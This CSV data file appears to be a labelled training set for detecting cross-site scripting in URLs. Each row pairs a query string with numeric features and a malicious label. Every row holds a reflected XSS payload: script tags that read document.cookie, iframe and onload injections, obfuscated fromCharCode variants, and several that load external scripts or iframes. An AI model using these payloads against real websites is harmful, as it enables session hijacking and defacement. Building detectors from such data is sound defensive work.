url,len,url_count,evil_char,evil_word,shang,label,,,,,,,,
"msg=You are a fucking looser, your session is now mine, mouhaha !<img src=http://vuln.xssed.net/thirdparty/scripts/xssed.gif><script>alert(document.cookie)</script>",2.092823363,1,1.555555556,5.666666667,0.761226802,1,,,,,,,,
action=login&error=<script>alert(document.cookie)</script>,-0.052272746,0,0.555555556,1,0.093821841,1,,,,,,,,
search_text=--><script>alert(document.cookie);</script><!--&x=10&y=7,0.150094812,0,0.777777778,1,0.874076653,1,,,,,,,,
"videoid='""--><script>alert(document.cookie)</script>",-0.17369328,0,0.888888889,1,0.37148091,1,,,,,,,,
next=esdt&revisit=yes&<script>alert(document.cookie)</script>,0.008437522,0,0.555555556,1,0.214165022,1,,,,,,,,
"inc=cash&nats=4483<""><script>alert(0x2222)</script>",-0.193930036,0,0.888888889,1,0.352653778,1,,,,,,,,
"act=register&return=aHR0cDovL2ltZy5iLXpvbmUucm8vdXNlcnMucGhwP2FjdD1sb2dpbi1k""><script>alert(/xss... Plm/)</script>",1.080985576,0,1,1.333333333,1.783927621,1,,,,,,,,
"sid=5017903&nid=651&area=&zoom=&centerPoint=&page_type=&new_zip=&zip_name=&type=0&city=&zipcode=&distance=&state=0&start=&end=&keyword=""><script>alert(document.cookie)</script>&sellertype=&acresstart=&acresend=&sale=1&homes_search=Search&sqftstart=&sqftend=&bedrooms=&bathrooms=&sale2=1",4.561707564,0,0.777777778,1,0.667829707,1,,,,,,,,
--><script>alert(1);//=</script>,-0.578428395,0,0.888888889,1,-0.278097545,1,,,,,,,,
"email='""><body onload=alert(1)>",-0.598665151,0,0.555555556,1,0.052895532,1,,,,,,,,
newsession=yes&tipo_visualizacao=RESUMO&b=ACOR&livre=<script>alert(document.cookie)</script>,0.63577695,0,0.555555556,1,0.988605654,1,,,,,,,,
"action=v&url=1<script>alert(""XSS"")</script>",-0.355824082,0,0.777777778,1,0.340505382,1,,,,,,,,
q=<script>alert(document.cookie)</script>,-0.396297593,0,0.555555556,1,0.169457961,1,,,,,,,,
zoekwoord=<script>alert(document.cookie);</script>,-0.214166791,0,0.555555556,1,0.250485792,1,,,,,,,,
"zip=""><script>alert(1);</script>",-0.578428395,0,0.777777778,1,-0.215378557,1,,,,,,,,
"f=""></embed></object><script>alert(document.cookie)</script>",-0.011799234,0,1.444444444,1,0.312176234,1,,,,,,,,
"cid=3&mid=""><iframe onload=alert(/SS/)>",-0.436771105,0,0.666666667,1,0.297073336,1,,,,,,,,
"gi=3&iz=""><iframe onload=alert(/SSS/)>",-0.45700786,0,0.666666667,1,0.368252848,1,,,,,,,,
"p=780&lang=""><iframe onload=alert(/XSS/)>",-0.396297593,0,0.666666667,1,0.621962985,1,,,,,,,,
"id=""><iframe onload=alert(/XSS/)>",-0.558191639,0,0.666666667,1,0.146812782,1,,,,,,,,
"pansearch=""><iframe onload=alert(/XSS/)>",-0.416534349,0,0.666666667,1,0.38811018,1,,,,,,,,
"id=103511""><script>alert(document.cookie)</script>&brand=",-0.072509501,0,0.777777778,1,0.710366322,1,,,,,,,,
"id=104576""><script>alert(document.cookie)</script>&brand=",-0.072509501,0,0.777777778,1,0.844830258,1,,,,,,,,
selectlanguage=<script>alert(/XSSED by Ahlspiess/)</script>&selectgenre=0&sort=&sortorder=0&page=&pagesize=,0.939328286,0,0.777777778,1.666666667,0.5356053,1,,,,,,,,
"id=103166""><script>alert(document.cookie)</script>&brand=",-0.072509501,0,0.777777778,1,0.731713861,1,,,,,,,,
"id=100829""><script>alert(document.cookie)</script>&brand=",-0.072509501,0,0.777777778,1,0.788272059,1,,,,,,,,
"id=86200""><script>alert(document.cookie)</script>&brand=TECH&product=",0.170331568,0,0.777777778,1,0.925592226,1,,,,,,,,
"id=105084""><script>alert(document.cookie)</script>&brand=",-0.072509501,0,0.777777778,1,0.788272059,1,,,,,,,,
"id=100586""><script>alert(document.cookie)</script>&brand=",-0.072509501,0,0.777777778,1,0.788272059,1,,,,,,,,
"id=96345""><script>alert(document.cookie)</script>&brand=TOSHIBA&product=/laptops-sales-rentals/buy_now.php?id=96345""><script>alert(document.cookie)</script>&brand=TOSHIBA&product=",2.396374699,0,1.777777778,2,1.365127399,1,,,,,,,,
"t=5233""><script>alert(document.cookie)</script>",-0.274877059,0,0.777777778,1,0.41610563,1,,,,,,,,
botid=d10d53a63e345abf&skin=<script>alert(document.cookie)</script>,0.129858056,0,0.555555556,1,0.831865827,1,,,,,,,,
"query=&cid=2""><script>alert('http://gu.venlik.com');</script>",0.008437522,1,1.222222222,1,0.971179343,1,,,,,,,,
"q=<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>&Submit=Search",0.170331568,0,0.777777778,1,1.120995923,1,,,,,,,,
"keyword=<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0.008437522,0,0.777777778,1,0.991127043,1,,,,,,,,
lid=GRXX0019&ltext=<script>alert(document.cookie)</script>,-0.052272746,0,0.555555556,1,0.728272463,1,,,,,,,,
"tab=""><script>alert(document.cookie)</script><!--""&q=",-0.153456524,0,1,1,0.628736363,1,,,,,,,,
year=<script>alert(0)</script>&action=FromArchive,-0.234403547,0,0.555555556,1,0.267974945,1,,,,,,,,
"q=""><img src=http://img225.imageshack.us/img225/4465/zombie2t.jpg /><iframe src=http://xssed.com></iframe><iframe src=http://hackebeil.blogspot.com></iframe><script>alert(document.cookie)</script><object width=640 height=385><param name=movie value=http://www.youtube.com/v/ys6pUis-Wfw?fs=1&amp;hl=de_DE></param><param name=allowFullScreen value=true></param><param name=allowscriptaccess value=always></param><embed src=http://www.youtube.com/v/ys6pUis-Wfw?fs=1&amp;hl=de_DE type=application/x-shockwave-flash allowscriptaccess=always allowfullscreen=true width=640 height=385></embed></object><br><a href=http://hackebeil.blogspot.com>hackebeil.blogspot.com</a>",12.19096448,1,8,9.333333333,1.400066231,1,,,,,,,,
fnt_clr=black&tbl_wdth=525&tbl_brdrclr=FFCC66&tbl_brd=0&td_bgclr=80FFFF&tbl_cellpading=3&tbl_cellspacing=0&tbl_font=Verdana&tbl_font_size=11&tbl_title_font_size=12&tbl_title_bgcolor=80FFFF&tbl_title_font_color=FF0000&morfi=3&what_day=123&ttl=0&fr1=0&fr2=0&tbl_title=<script>alert(document.cookie)</script>,4.946205923,0,0.555555556,1,0.813468382,1,,,,,,,,
"id=341&ch=DEF&url=""><script>alert('Killer-TR')</script>'""><iframe+src=http://i43.tinypic.com/2lksbgo.png>",0.898854774,1,1.888888889,1.333333333,1.399195837,1,,,,,,,,
"url=/aaaaa""><script>alert(document.cookie)</script>",-0.193930036,0,0.888888889,1,0.139158452,1,,,,,,,,
picCAT=faces&picID=1&Descr=<script>alert(document.cookie)</script>,0.1096213,0,0.555555556,1,0.556645907,1,,,,,,,,
"TEMPORARY_TEMPLATE=19&img=""><script>alert(document.cookie)</script>",0.129858056,0,0.777777778,1,1.306043786,1,,,,,,,,
;message=<script>alert(document.cookie)</script>.;message_type=GOOD,0.129858056,0,0.555555556,1,0.557362365,1,,,,,,,,
action=get<script>alert(document.cookie)</script><iframe src=http://www.xssed.com/><iframe>,0.615540194,1,1.333333333,1.666666667,0.529888413,1,,,,,,,,
"searWords=<iframe src=""http://xssed.com"">&area=1&Send=Rechercher",0.069147789,1,0.666666667,0.666666667,0.358309181,1,,,,,,,,
citta=</script><script>alert(document.cookie)</script>&width=728&height=90&type=IncontraGente_LeaderboardTop&facebookName=Nicola&eta=23&sesso=0&igModule=profile&socialnetwork=www_fbconnect&domain=www_incontragente_com,3.165371417,0,0.888888889,1.333333333,0.920338286,1,,,,,,,,
"error=Hacked by RME'));""><iframesrc=http://xssed.com><script>alert(document.cookie)</script>",0.63577695,1,1.333333333,2,0.948927077,1,,,,,,,,
"g=<marquee height=""150"" direction=""up""><img src=""http://insecurity.ro/board/images/styles/augreensmc/gradients/augreen_logo.png""></marquee><script>alert(document.cookie)</script>",2.376137944,1,2.888888889,2.333333333,0.745897278,1,,,,,,,,
"main=9<marquee height=""150"" direction=""up""><img src=""http://www.silicon-power.com/images/utf8/smgrpic/13_010610_2986602.jpg""></marquee><script>alert(document.cookie)</script>&currlang=utf8",2.578505501,1,2.666666667,2.333333333,1.351994468,1,,,,,,,,
"palabra=""><script>alert(document.cookie)</script>",-0.234403547,0,0.777777778,1,0.243142094,1,,,,,,,,
"video=""/><script>alert(String.fromCharCode(120,115,115))</script>&t=Chaque&TB_iframe=true&height=475&width=820",1.000038553,0,1.111111111,1,1.372979669,1,,,,,,,,
text='<script>alert(document.cookie)</script>,-0.31535057,0,0.666666667,1,0.15103531,1,,,,,,,,
"q=""><script>alert(1)</script>",-0.639138662,0,0.777777778,1,-0.293202043,1,,,,,,,,
"img=""><script>alert(String.fromCharCode(88,83,83,69,68,32,98,121,32,65,104,108,115,112,105,101,115,115))</script>",1.06074882,0,2.666666667,1,0.646925574,1,,,,,,,,
"r=54898de7<script>alert(document.cookie)</script>&cc=tapz""></iframe><script>alert(1337)</script><iframe src=""http://www.xssed.com/""></iframe>",1.627377981,1,2.777777778,2.666666667,0.947662152,1,,,,,,,,
"id=1036""/><iframe src=""http://xssed.com""><&destination=&query=Suchbegriff",0.251278591,1,1.111111111,0.666666667,1.060599722,1,,,,,,,,
"page_id=60&v=repertoire_detail&pi=110&mid=16""><iframe src=http://www.xssed.com>",0.372699125,1,0.666666667,0.666666667,0.79654212,1,,,,,,,,
"s_str=""/><iframe src=""http://xssed.com"">",-0.416534349,1,1,0.666666667,0.166078829,1,,,,,,,,
"section=65&sMonth=all&sKeyword=""/><iframe src=http://xssed.com>&f_vtype=&sRubrik=&sReferent=",0.63577695,1,0.777777778,0.666666667,1.004314702,1,,,,,,,,
"STATE=<""""><script>alert(document.cookie)</script>",-0.234403547,0,1,1,0.547270194,1,,,,,,,,
listname=<script>alert(document.cookie)</script>,-0.254640303,0,0.555555556,1,0.082339405,1,,,,,,,,
"lang=""><iframe+src=http://xssed.com>",-0.497481372,1,0.666666667,0.333333333,0.539471764,1,,,,,,,,
"search='""><script>alert(document.cookie)</script>'""><iframe+src=http://www.google></iframe>&source=4shared&sid=",1.020275309,1,2,1.333333333,0.781905617,1,,,,,,,,
"q=""/>+<iframe src=""http://xssed.com"">",-0.477244616,1,1,0.666666667,0.39069062,1,,,,,,,,
"search='""><script>alert(document.cookie)</script>'""><iframe+src=http://www.google></iframe>&source=4shared&sid=",1.020275309,1,2,1.333333333,0.781905617,1,,,,,,,,
"type=all&srch_words='""><script>alert(document.cookie)</script>'""><iframe+src=http://www.google></iframe>&search=1&Submit=+SEARCH+",1.384536912,1,2,1.333333333,1.281230702,1,,,,,,,,
"search='""><script>alert(document.cookie)</script>'""><iframe+src=http://www.google></iframe>&sa2=Search+",0.858381263,1,2,1.333333333,0.829417702,1,,,,,,,,
"search='""><script>alert(document.cookie)</script>'""><iframe+src=http://www.google></iframe>&source=4shared&sid=",1.020275309,1,2,1.333333333,0.781905617,1,,,,,,,,
"search='""><script>alert(document.cookie)</script>'""><iframesrc=http://www.google></iframe>",0.595303438,1,2,1.333333333,0.620864373,1,,,,,,,,
"query='""><script>alert(document.cookie)</script>'""><iframe+src=http://www.google.com></iframe>&cbsearch=Search",1.000038553,1,2,1.333333333,0.886407593,1,,,,,,,,
"search='""><script>alert(document.cookie)</script>'""><iframe src=http://www.google.com></iframe>",0.696487217,1,2,1.666666667,0.669831841,1,,,,,,,,
"search='""><script>alert(document.cookie)</script>'""><iframe+src=http://www.google></iframe>&sid=",0.716723973,1,2,1.333333333,0.756783917,1,,,,,,,,
"query='""><script>alert(document.cookie)</script>'""><iframe src=http://www.google.com></iframe>",0.676250461,1,2,1.666666667,0.794081217,1,,,,,,,,
"url='""><script>alert(document.cookie)</script>'""><iframe src=http://www.google.com></iframe>",0.63577695,1,2,1.666666667,0.703232117,1,,,,,,,,
"keyword='""><script>alert(document.cookie)</script>'""><iframe src=http://www.google.com></iframe>",0.716723973,1,2,1.666666667,0.747850098,1,,,,,,,,
"keyword='""><script>alert(document.cookie)</script>'""><iframe+src=http://www.google.com></iframe>&submitme=submitme",1.080985576,1,2,1.333333333,0.818696038,1,,,,,,,,
"id=screenshot37b.jpg""<marquee><script>alert(/XSSed/.source)</script>",0.150094812,0,1.111111111,1,0.701342709,1,,,,,,,,
"i="" /><marquee><script>alert(/XSSed/.source)</script>",-0.153456524,0,1.333333333,1.333333333,0.298606735,1,,,,,,,,
"gal=img29/7866/..""><marquee><script>alert(1)</script>",-0.153456524,0,1.222222222,1,0.616864214,1,,,,,,,,
"id='16&cart=255&group=0""><script>alert('XSS')</script>&cat=0&subcat=0&start=&prodkey=",0.49411966,0,1.111111111,1,0.691746827,1,,,,,,,,
"requestURI=/center</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0.473882904,0,1.666666667,1.333333333,1.086701703,1,,,,,,,,
"search='""><script>alert(document.cookie)</script>'""><iframe src=http://www.google></iframe>",0.615540194,1,2,1.666666667,0.680278162,1,,,,,,,,
s=closed&keyword=<script>alert(1)</script>,-0.376060837,0,0.555555556,1,0.141222402,1,,,,,,,,
"CID=7000&location=</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0.473882904,0,1.555555556,1.333333333,1.218240222,1,,,,,,,,
"text=<SCRIPT/XSS+SRC=""http://vuln.xssed.net/thirdparty/scripts/gurus.js""></SCRIPT>",0.433409392,1,1.444444444,1.333333333,0.891649556,1,,,,,,,,
popup_show=1//--></script><ScRiPt >alert(document.cookie);</ScRiPt>,0.129858056,0,1.222222222,1.666666667,0.82946323,1,,,,,,,,
"src=<script>document.write(""bob"")</script>",-0.376060837,0,0.777777778,1,0.093436506,1,,,,,,,,
"DSP=""><script>alert(document.cookie)</script>",-0.31535057,0,0.777777778,1,0.437596849,1,,,,,,,,
"in_hi_space=SearchResult&in_hi_control=bannerstart&in_hi_userid=2&in_tx_query=length:1}//+<script>alert(""pwned"")</script>length:1}//+<script>alert(""by sh3n"")</script>",2.133296875,0,2,2.333333333,0.960323917,1,,,,,,,,
"pageid=47&searchType=&completeWords='>""><script>alert(/XssedBy Pierre/)</script>",0.392935881,0,1.222222222,1.333333333,0.668563266,1,,,,,,,,
enews=DoForPl&plid=3&classid=5&id=6&dopl=1&doajax=1&ajaxarea=<script>alert(/Xssed By Pierre/)</script>,0.838144507,0,0.777777778,1.666666667,0.740449121,1,,,,,,,,
enews=DoForPl&plid=2146&classid=17&id=35&dopl=1&doajax=1&ajaxarea=<script>alert(/Xssed By Pierre/)</script>,0.939328286,0,0.777777778,1.666666667,0.912741736,1,,,,,,,,
enews=DoForPl&plid=18&classid=1&id=3&dopl=1&doajax=1&ajaxarea=<bodyonload=prompt(520)>,0.514356415,0,0.222222222,0.666666667,0.588460044,1,,,,,,,,
classid=18&id=2577&dotop=1&doajax=1&ajaxarea=<script>alert(/Xssed by Pierre/)</script>,0.514356415,0,0.777777778,1.666666667,0.673889338,1,,,,,,,,
classid=37&id=77&dotop=1&doajax=1&ajaxarea=<script>alert(/Xssed by Pierre/)</script>,0.473882904,0,0.777777778,1.666666667,0.549894509,1,,,,,,,,
enews=DoForPl&plid=5&classid=6&id=7&dopl=1&doajax=1&ajaxarea=<script>alert(/Xssed By Pierre/)</script>,0.838144507,0,0.777777778,1.666666667,0.740449121,1,,,,,,,,
classid=25&id=4274&url=http://xssed.com,-0.436771105,1,0.222222222,0,0.359473834,1,,,,,,,,
store=36&keywords=<script>alert(document.cookie)</script>,-0.072509501,0,0.555555556,1,0.387446952,1,,,,,,,,
"pagina=profiel&id=37 ""><script>alert(/ Killer-TR /)</script><h1>Killer-TR ownz!</h1>",0.473882904,0,1.555555556,2.333333333,0.961355291,1,,,,,,,,
"hledej=""><script>alert(123);</script>",-0.477244616,0,0.777777778,1,0.270673674,1,,,,,,,,
"file=edamam01&word=edamame&text=<img src=""/favicon.ico"" onload=""alert(document.cookie)"" />",0.595303438,0,0.888888889,2,0.597525118,1,,,,,,,,
"id='134""><script>alert('XSS')</script>",-0.45700786,0,1.111111111,1,0.251394242,1,,,,,,,,
"scode=004&dqdomain=--""><img src=x onerror=alert('1337');>",-0.072509501,0,0.666666667,1.666666667,0.898564351,1,,,,,,,,
"msg=</><script>alert(""XsSeD by Angle a.k.a Malwarrior"");</script>",0.089384545,0,1.111111111,2.333333333,0.858016056,1,,,,,,,,
"q=""><iframe+src=""xssed.org"">",-0.659375418,0,0.666666667,0.333333333,-0.192701988,1,,,,,,,,
"q=""><script>alert('XSS')</script>&sid=52&ref=1&at=0",-0.193930036,0,1,1,0.566149104,1,,,,,,,,
"id=6987""><script>alert(document.cookie)</script>",-0.254640303,0,0.777777778,1,0.514020396,1,,,,,,,,
"id=254""><script>alert(document.cookie)</script>",-0.274877059,0,0.777777778,1,0.428607455,1,,,,,,,,
"id=4138""><script>alert(document.cookie)</script>",-0.254640303,0,0.777777778,1,0.514020396,1,,,,,,,,
"id=11117""><script>alert(document.cookie)</script>",-0.234403547,0,0.777777778,1,0.333767136,1,,,,,,,,
"id=74""><script>alert(document.cookie)</script>",-0.295113814,0,0.777777778,1,0.340556611,1,,,,,,,,
"id=402""><script>alert(document.cookie)</script>",-0.274877059,0,0.777777778,1,0.428607455,1,,,,,,,,
"id=94317""><ScRiPT>alert(document.cookie)</ScRiPT>&brand=DELL&safe_id=NBDEV37002132503W7P&product=",0.736960728,0,0.777777778,1,1.755093165,1,,,,,,,,
"id=88270""><script>alert(document.cookie)</script>&brand=TECH",-0.011799234,0,0.777777778,1,0.999488952,1,,,,,,,,
"id=95930""><script>alert(document.cookie)</script>&brand=TOSHIBA&safe_id=L655-14F&product=TOSHIBA Satellite L655 Core i5-450M (2.402.66 GHz Turbo) 1066MHz, 2GB DDR3 (1066MHz), 1GB DDR3 (1066MHz) 2nd MEM, 500GB(5400rmp) SATA, 15.6 inch  HD 200 CSV LD DVD-SuperMulti +-R DL(SATA), ATI Madison-LP 1GB(DDR3), Broadcom 802.11(bgn)BCM94313, BT V2.1+EDR, VGA (0.3Mpix) wo auto macro (wMic), 10100MBit, 6 Cell - 4400, Win7 64bit Home Premium, Flat KB Half Glossy Black, 1 Year Collect Repair and Return Warranty, Modena Red",9.175687873,0,2.333333333,22.33333333,2.033725675,1,,,,,,,,
"id=<ScriPt>alert(""XsS"")</script>",-0.578428395,0,0.777777778,1,-0.038583659,1,,,,,,,,
"id=225 ""><script>alert(/XSS by -Chosen-/)</script>",-0.214166791,0,1,2,0.797904479,1,,,,,,,,
"id=355 ""><script>alert(/XSS by -Chosen-/)</script>",-0.214166791,0,1,2,0.797904479,1,,,,,,,,
msg=<script>alert(document.cookie)</script>,-0.355824082,0,0.555555556,1,0.180639186,1,,,,,,,,
msg=<script>alert(document.cookie)</script>,-0.355824082,0,0.555555556,1,0.180639186,1,,,,,,,,
strWord=<script>alert(document.cookie)</script>,-0.274877059,0,0.555555556,1,0.069721362,1,,,,,,,,
"searchtext=""></title><script>alert(document.cookie);</script>top",0.069147789,0,1.111111111,1,0.178417579,1,,,,,,,,
"a=""><ScRiPt >alert(""Xss by d3vbit3"");</ScRiPt>",-0.295113814,0,1,2,0.550805566,1,,,,,,,,
"account_num='""--></style></script><script>alert('XSS')</script> ",0.069147789,0,1.777777778,1.666666667,0.484801043,1,,,,,,,,
c=Page&childpagename=DLinkEurope-ES/DLGeneric&cid=1197370344419&p=1197370344419&packedargs=category=QuickProductFinder&locale=1195806681347&renderStyle=ErrorProductSearch&term=<script>alert(document.cookie)</script>&pagename=DLinkEurope-ES/DLWrapper,3.812947601,0,0.777777778,1,1.332893953,1,,,,,,,,
"buscador1="""")<></><script>alert(document.cookie)</script><&buscador10=buscadorAvanzado&c=Page&cid=1109266587773&language=es&pagename=ComunidadMadrid/Estructura",1.991639584,0,1.555555556,1,1.169799455,1,,,,,,,,
page=b&TxtBusca=<script>alert(document.cookie)</script>,-0.112983013,0,0.555555556,1,0.558366694,1,,,,,,,,
access=p&entqr=0&output=xml_no_dtd&sort=date:D:L:d1&ud=1&ie=UTF-8&client=default_frontend&oe=UTF-8&proxystylesheet=default_frontend&q=<script>alert(document.cookie)</script>&ip=80.58.205.98&filter=p,2.780873058,0,0.555555556,1,1.104671619,1,,,,,,,,
q=<script>alert(document.cookie)</script>&x=0&y=0,-0.234403547,0,0.555555556,1,0.572103045,1,,,,,,,,
"zoom_query=""/><script>alert(document.cookie)</script>&search=1&lang=es",0.190568323,0,0.888888889,1,0.770721458,1,,,,,,,,
"codigo=0&numero_pagina=""/><script>alert(document.cookie)</script>",0.089384545,0,0.888888889,1,0.508359207,1,,,,,,,,
shop_mode=product_search&my_search=<script>alert(document.cookie)</script>,0.271515346,0,0.555555556,1,0.316627983,1,,,,,,,,
"page_id=5""><script>alert(document.cookie)</script>",-0.214166791,0,0.777777778,1,0.419578637,1,,,,,,,,
"q=r&q=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",3.570106532,0,3.888888889,2.666666667,1.050424429,1,,,,,,,,
data=<script>alert(document.cookie)</script>,-0.335587326,0,0.555555556,1,0.069297877,1,,,,,,,,
"paketid=2&plan=<iframe src=""http://experlizm.com"">",-0.214166791,1,0.666666667,0.666666667,0.628811634,1,,,,,,,,
"go_ref_url=>""><ScRiPt >alert(""Xss by d3vbit3"");</ScRiPt>",-0.092746257,0,1.111111111,2,0.944550661,1,,,,,,,,
"url=""><script>alert(/xss/)</script>",-0.517718128,0,1,1,-0.361554074,1,,,,,,,,
"searchstring=""><iframe src=""http://xssed.com"">&x=0&y=0&id=/de/suche.htm",0.210805079,1,1.111111111,0.666666667,0.583551147,1,,,,,,,,
"area=Sparten""><iframe src=""http://xssed.com"">",-0.31535057,1,0.888888889,0.666666667,0.276756126,1,,,,,,,,
"cat=6&id=""><script>alert(""Virtual_SystEm"")</script>",-0.193930036,0,1,1,0.368147855,1,,,,,,,,
"title=horgullo+gay&min=Desde&max=Hasta&tipo=articulos&group_nid=""><iframe src=""http://xssed.com"">",0.736960728,1,0.888888889,0.666666667,0.823161627,1,,,,,,,,
a_code=1<iframe/+/onload=alert(123)></iframe>.,-0.295113814,0,0.777777778,0.666666667,0.310604791,1,,,,,,,,
